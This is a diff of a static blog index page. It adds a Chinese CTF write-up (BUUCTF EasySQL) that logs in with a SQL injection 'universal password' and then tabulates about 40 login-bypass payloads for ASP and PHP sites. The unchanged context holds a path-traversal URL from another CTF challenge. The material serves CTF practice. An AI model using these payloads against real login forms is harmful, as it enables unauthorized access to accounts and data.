@@ -169,6 +169,201 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-sql" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/01/24/sql/" class="article-date">
+  	<time datetime="2021-01-24T09:51:45.000Z" itemprop="datePublished">2021-01-24</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/01/24/sql/">
+        10-buu练习EasySQL2
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>打开题目链接，如下：<br><img src="/2021/01/24/sql/sql2.png"><br>尝试万能密码：<br>用户名–&gt;admin；<br>密码–&gt;1’or’1’=’1<br><img src="/2021/01/24/sql/sql1.png"><br>竟然真的出来了<br>真是轻松的一天！（难得啊）</p>
+<h2>接下来总结一下万能密码：</h2>
+<h3>aspx万能密码</h3>
+<table border="1">
+<tr>
+<td>asp</td>
+<td>aspx万能密码</td>
+</tr>
+<tr>
+<td>1</td>
+<td>"or “a”="a</td>
+</tr>
+<tr>
+<td>2：</td>
+<td>‘.).or.(’.a.’=’.a</td>
+</tr>
+<tr>
+<td>3：</td>
+<td>or 1=1–</td>
+</tr>
+<tr>
+<td>4：</td>
+<td>'or 1=1–</td>
+</tr>
+<tr>
+<td>5：</td>
+<td>a’or’ 1=1–</td>
+</tr>
+<tr>
+<td>6：</td>
+<td>"or 1=1–</td>
+</tr>
+<tr>
+<td>7：</td>
+<td>'or.‘a.’='a</td>
+</tr>
+<tr>
+<td>8：</td>
+<td>“or”="a’='a</td>
+</tr>
+<tr>
+<td>9：</td>
+<td>‘or’’=’</td>
+</tr>
+<tr>
+<td>10：</td>
+<td>‘or’=‘or’</td>
+</tr>
+<tr>
+<td>11：</td>
+<td>admin’or 1=1#</td>
+</tr>
+
+<table border="1">
+<h3>PHP万能密码</h3>
+<tr>
+<td>php</td><td>PHP万能密码</td>
+</tr>
+<tr>
+<td>1</td><td>'or 1=1/*</td>
+</tr>
+<tr>
+<td>2</td><td>"or “a”="a</td>
+</tr>
+<tr>
+<td>3</td><td>"or 1=1–</td>
+</tr>
+<tr>
+<td>4</td><td>“or”="</td>
+</tr>
+<tr>
+<td>5</td><td>“or”="a’='a</td>
+</tr>
+<tr>
+<td>6</td><td>"or1=1–</td>
+</tr>
+<tr>
+<td>7</td><td>“or=or”</td>
+</tr>
+<tr>
+<td>8</td><td>'‘or’=‘or’</td>
+</tr>
+<tr>
+<td>9</td><td>') or (‘a’='a</td>
+</tr>
+<tr>
+<td>10</td><td>‘.).or.(’.a.’=’.a</td>
+</tr>
+<tr>
+<td>11</td><td>'or 1=1</td>
+</tr>
+<tr>
+<td>12</td><td>'or 1=1–</td>
+</tr>
+<tr>
+<td>13</td><td>'or 1=1/*</td>
+</tr>
+<tr>
+<td>14</td><td>‘or"="a’='a</td>
+</tr>
+<tr>
+<td>15</td><td>‘or’ ‘1’=‘1’</td>
+</tr>
+<tr>
+<td>16</td><td>‘or’’=’</td>
+</tr>
+<tr>
+<td>17</td><td>‘or’’=’‘or’’=’</td>
+</tr>
+<tr>
+<td>18</td><td>‘or’=‘1’</td>
+</tr>
+<tr>
+<td>19</td><td>‘or’=‘or’</td>
+</tr>
+<tr>
+<td>20</td><td>'or.‘a.’='a</td>
+</tr>
+<tr>
+<td>21</td><td>'or1=1–</td>
+</tr>
+<tr>
+<td>22</td><td>1’or’1’='1</td>
+</tr>
+<tr>
+<td>23</td><td>a’or’ 1=1–</td>
+</tr>
+<tr>
+<td>24</td><td>a’or’1=1–</td>
+</tr>
+<tr>
+<td>25</td><td>or ‘a’=‘a’</td>
+</tr>
+<tr>
+<td>26</td><td>or 1=1–</td>
+</tr>
+<tr>
+<td>27</td><td>or1=1–</td>
+</tr>
+<tr>
+<td>admin’/*</td><td>密码*/’</td>
+</tr></table></table>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-mdwu" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -791,75 +986,6 @@ X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连�
       
         <p>打开题目链接，是一幅图片，我们查看源代码<br><img src="/2021/01/15/phpshenji/ppp2.png"><br>题目地址是source.php，输入地址后代码如下：<br><img src="/2021/01/15/phpshenji/ppp3.png"><br>由<br>$whitelist = [“source”=&gt;”source.php”,”hint”=&gt;”hint.php”];<br>得到另一个地址/hint.php，打开后看到如下界面<br><img src="/2021/01/15/phpshenji/ppp1.png"><br>继续查看source.php代码<br><img src="/2021/01/15/phpshenji/ppp4.png"><br>这段代码告诉们需要满足三个条件</p>
 <p>1.值为非空<br>2.值为字符串<br>3.能够通过checkFile()函数校验<br>否则打印滑稽<br>查看checkfile()函数–&gt;highlight_file()函数<br><img src="/2021/01/15/phpshenji/ppp5.png"><br>其中包含4个if语句：<br>1.第一个if语句对变量进行检验，要求$page为字符串，否则返回false<br>2.第二个if语句判断$page是否存在于$whitelist数组中，存在则返回true<br>3.第三个if语句判断截取后的$page是否存在于$whitelist数组中，截取$page中’?’前部分，存在则返回true<br>4.第四个if语句判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true<br>————————<br>若以上四个if语句均未返回值，则返回false<br>有三个if语句可以返回true，第二个语句直接判断$page，不可用<br>第三个语句截取’?’前部分，由于?被后部分被解析为get方式提交的参数，也不可利用<br>第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?’，仍可通过第四个if语句校验。（’?’两次编码值为’%253f’）,构造url：<br><a target="_blank" rel="noopener" href="http://399fe153-1f62-43d5-a67f-e645a0e7ac66.node3.buuoj.cn/source.php?file=source.php%253f../../../../../ffffllllaaaagggg">http://399fe153-1f62-43d5-a67f-e645a0e7ac66.node3.buuoj.cn/source.php?file=source.php%253f../../../../../ffffllllaaaagggg</a><br>即可得到flag：<br><img src="/2021/01/15/phpshenji/ppp6.png"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-php靶场" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/01/15/php%E9%9D%B6%E5%9C%BA/" class="article-date">
-  	<time datetime="2021-01-15T12:33:57.000Z" itemprop="datePublished">2021-01-15</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/15/php%E9%9D%B6%E5%9C%BA/">
-        sqlilabs靶场的搭建
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>下载PHPstudy（具体步骤见本霸霸上一篇博客）之后，配置如下环境<br><img src="/2021/01/15/php%E9%9D%B6%E5%9C%BA/sql0.png"><br><br>然后访问网址：（<a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs%EF%BC%89">https://github.com/Audi-1/sqli-labs）</a> 如下图<br><br><img src="/2021/01/15/php%E9%9D%B6%E5%9C%BA/sql3.png"><br><br>下载zip文件<br><br><img src="/2021/01/15/php%E9%9D%B6%E5%9C%BA/sql4.png"><br><br>下载过后将文件复制到如下路径中，并将文件名修改为sql<br><br><img src="/2021/01/15/php%E9%9D%B6%E5%9C%BA/sql5.png"><br><br>然后再浏览器上访问：（<a target="_blank" rel="noopener" href="https://localhost/sql/%EF%BC%89">https://localhost/sql/）</a> 会出现以下界面<br><br><img src="/2021/01/15/php%E9%9D%B6%E5%9C%BA/sql1.png"><br><br>点击第一个出现以下界面<br><br><img src="/2021/01/15/php%E9%9D%B6%E5%9C%BA/sql2.png"><br><br>则sqlilabs靶场搭建成功<br></p>
-<h3>注：</h3>
-<p>sqli-labs靶场需要php环境。而且对php7不兼容，当初写这个靶场印度程序员使用的版本不是php7，当时的一些函数在php7中被删除了。所以，使用此靶场请下载5.5或之前的版本，如下图</p>
-<img src="/2021/01/15/php%E9%9D%B6%E5%9C%BA/sql7.png">
-<br>如果未成功显示successfully页面。可能存在两种原因:<br>
-
-<ul>
-<li>1.访问路径不正确。
-</li><li>2.php版本不兼容
-</li></ul>
-<b>解决方法：</b>
-<ul>
-<li>1 http://localhost/sql/ 这个sql文件夹是自己创建的，如果没有创建该文件夹，而是在解压sql-labs压缩包时直接将其解压到WWW目录下，则直接访问http://localhost/。
-</li><li>2 将php版本换到5.5及以下。
-</li></ul>
 
       
     </div>
